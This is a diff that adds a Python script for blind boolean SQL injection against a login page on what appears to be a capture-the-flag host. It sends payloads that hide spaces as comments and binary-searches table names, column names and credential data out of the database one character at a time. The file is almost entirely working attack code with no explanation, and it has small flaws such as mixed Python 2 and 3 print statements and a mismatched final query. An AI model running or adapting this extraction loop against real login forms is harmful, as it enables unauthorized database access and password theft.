@@ -1,0 +1,54 @@
+#coding=utf-8
+import requests
+url = "http://web.jarvisoj.com:32787/login.php"
+char_set = "0123456789abcdefghijklmnopqrstuvwxyzABCDDEFGHIJKLMNOPQRSTUVWXYZ"
+#udata ="sdadasdas'/**/or/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),{0},1))>{1}/**/#"
+#udata="fuckyouadmin'/**/or/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),{0},1))>={1}/**/#"
+#udata="fuckyouadmin'/**/or/**/ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()),{0},1))>={1}/**/#"
+udata="fuckyouadmin'/**/or/**/ascii(substr((select/**/group_concat(id,username,password)/**/from/**/information_schema.columns/**/where/**/table_schema=database()),{0},1))>={1}/**/#"
+def addslash(exp):
+    tot = ''
+    for i in range(len(exp)):
+        if exp[i] == ' ':
+            tot += '/**/'
+        else:
+            tot += exp[i]
+    return tot
+
+def check(num):
+    udata2 = udata1.format(i,mid)
+    postdata = {
+        'username':udata2,
+        'password':'123456'
+    }
+    r = requests.post(
+        url = url,
+        data = postdata
+    )
+    response = r.content
+    return "密码" in response
+ans = ''
+mylen = input("give len:")
+mylen = int(mylen)
+for i in range(1,mylen):
+    print("brute force....%d"%(i))
+    udata1 = udata
+    left = 0
+    right = 255
+    while left<right:
+        mid = (left+right+1)>>1
+        if(check(mid)):
+            left = mid
+        else:
+           right = mid- 1
+
+        print(left,right)
+    ans += chr(left)
+    print left
+print (ans)
+
+
+"""
+admin
+
+"""
